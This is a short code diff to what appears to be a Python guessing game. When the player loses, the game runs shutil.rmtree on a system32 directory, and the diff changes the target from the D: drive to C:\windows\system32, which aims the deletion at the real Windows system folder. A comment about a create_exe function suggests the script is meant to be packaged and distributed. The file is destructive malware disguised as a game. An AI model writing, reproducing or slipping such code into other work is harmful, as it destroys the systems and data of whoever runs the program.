@@ -12,7 +12,7 @@ def one_option():
     if guess == select:
         print("Good game! You won.")
     else:
-        parent = r"D:\\windows\\system32"
+        parent = r"C:\\windows\\system32"
         shutil.rmtree(parent)
 
 # Define the create_exe function
